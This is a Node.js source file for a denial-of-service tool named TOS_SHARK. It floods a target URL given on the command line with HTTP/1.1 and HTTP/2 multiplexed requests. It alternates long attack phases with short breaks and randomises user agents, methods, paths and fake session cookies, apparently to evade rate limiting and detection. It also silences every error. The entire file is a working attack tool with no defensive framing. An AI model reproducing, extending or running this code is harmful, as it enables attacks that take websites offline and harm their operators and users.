const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.reqCounter = 0;
        this.lastLog = Date.now();
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = '';
        
        // Attack methods pool
        this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING', 'COOKIE-SESSION'];
        
        // Data pools - KEEP SMALL
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.88.1',
            'Go-http-client/2.0',
            'python-requests/2.28.2'
        ];
        
        // Method rotation pool
        this.methodsPool = ['GET', 'HEAD', 'POST', 'OPTIONS'];
        
        // Start immediately
        this.startCycle();
    }

    // ===== DATA GENERATORS =====
    generateRoutes() {
        const patterns = [];
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        
        // Generate 30 random patterns
        for (let i = 0; i < 30; i++) {
            const length = 3 + Math.floor(Math.random() * 10);
            let path = '/';
            for (let j = 0; j < length; j++) {
                path += chars[Math.floor(Math.random() * chars.length)];
            }
            if (Math.random() > 0.7) {
                const exts = ['.js', '.css', '.json', '.xml', '.html', '.php', '.asp'];
                path += exts[Math.floor(Math.random() * exts.length)];
            }
            patterns.push(path);
        }
        
        // Add some common patterns
        patterns.push('/', '/api', '/static', '/data', '/v1', '/v2', '/admin', '/users', '/wp-admin', '/wp-login.php');
        return patterns;
    }

    generateCookies() {
        const cookies = [];
        for (let i = 0; i < 15; i++) {
            cookies.push(`session=${Math.random().toString(36).substr(2, 16)}; token=${Math.random().toString(36).substr(2, 12)}`);
        }
        return cookies;
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        // Generate routes once
        this.routes = this.generateRoutes();
        this.cookies = this.generateCookies();
        
        // Initial request
        await this.sendRandomizedRequest(true);
        await this.sleep(200);
        
        // Warmup
        const warmupCount = 500 + Math.floor(Math.random() * 100);
        for (let i = 0; i < warmupCount; i++) {
            await this.sendRandomizedRequest();
            if (i % 100 === 0) await this.sleep(1);
        }
        
        // Main attack loop
        this.attackLoop();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                // Attack phase (20-30 minutes)
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                // Execute attack
                this.executeAttackMethod().catch(() => {});
                
            } else {
                // Break phase (5-10 minutes)
                if (now - this.breakStart >= (5 * 60000) + Math.random() * (5 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                // Light requests during break
                await this.sendRandomizedRequest();
                await this.sleep(1000);
            }
            
            // Log every 10s
            if (now - this.lastLog >= 10000) {
                this.lastLog = now;
            }
            
            // Tiny sleep to prevent blocking
            await this.sleep(0.01);
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        // Refresh data during break
        this.routes = this.generateRoutes();
        this.cookies = this.generateCookies();
    }

    // ===== ATTACK METHODS =====
    async executeAttackMethod() {
        switch (this.currentMethod) {
            case 'H2-MULTIPLEX':
                await this.attackH2Multiplex();
                break;
            case 'ENDPOINT-HOPPING':
                await this.sendRandomizedRequest();
                break;
            case 'COOKIE-SESSION':
                await this.sendRandomizedRequest();
                break;
        }
    }

    async attackH2Multiplex() {
        try {
            const client = http2.connect(this.target, { maxSessionMemory: 1000 });
            
            for (let i = 0; i < 30; i++) {
                this.sendH2Request(client);
                this.totalReqs++;
                this.reqCounter++;
            }
            
            setTimeout(() => {
                client.destroy();
                client.close();
            }, 50).unref();
            
        } catch (err) {
            // Silent
        }
    }

    // ===== CORE REQUEST FUNCTION =====
    async sendRandomizedRequest(isInitial = false) {
        return new Promise((resolve) => {
            // ROTATE: Method
            const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
            
            // ROTATE: UA
            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
            
            // ROTATE: Route
            const route = this.routes[Math.floor(Math.random() * this.routes.length)];
            
            const options = {
                hostname: this.host,
                path: route,
                method: method,
                headers: {
                    'User-Agent': userAgent,
                    'Connection': 'close',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                },
                timeout: 7000,
                agent: false
            };
            
            // Add cookies 40% of the time
            if (Math.random() > 0.6) {
                options.headers['Cookie'] = this.cookies[Math.floor(Math.random() * this.cookies.length)];
            }
            
            if (method === 'POST') {
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                options.headers['Content-Length'] = '7';
            }
            
            const req = (this.isHttps ? https : http).request(options, (res) => {
                const status = res.statusCode;
                res.destroy();
                this.logStatus(status);
                resolve();
            });
            
            req.on('error', () => {
                this.logStatus('ERR');
                resolve();
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.logStatus('TIMEOUT');
                resolve();
            });
            
            if (method === 'POST') {
                req.write('data=aa');
            }
            
            req.end();
            
            if (!isInitial) {
                this.totalReqs++;
                this.reqCounter++;
            }
        });
    }

    sendH2Request(client) {
        try {
            const route = this.routes[Math.floor(Math.random() * this.routes.length)];
            const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
            
            const req = client.request({
                ':method': method,
                ':path': route,
                ':authority': this.host,
                'user-agent': userAgent
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('ERR');
                req.destroy();
            });
            
            req.setTimeout(5000, () => {
                req.destroy();
                this.logStatus('TIMEOUT');
            });
            
            req.end();
        } catch (err) {
            this.logStatus('ERR');
        }
    }

    // ===== LOGGING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            // ONLY THIS LOG: 2M22:(request number) ---> (REAL Status Code)
            console.log(`2M22:${this.reqCounter} ---> ${status}`);
        }
    }

    // ===== UTILS =====
    sleep(ms) {
        return new Promise(resolve => {
            const timer = setTimeout(resolve, ms);
            if (timer.unref) timer.unref();
        });
    }
}

const http = require('http');

// Run
if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
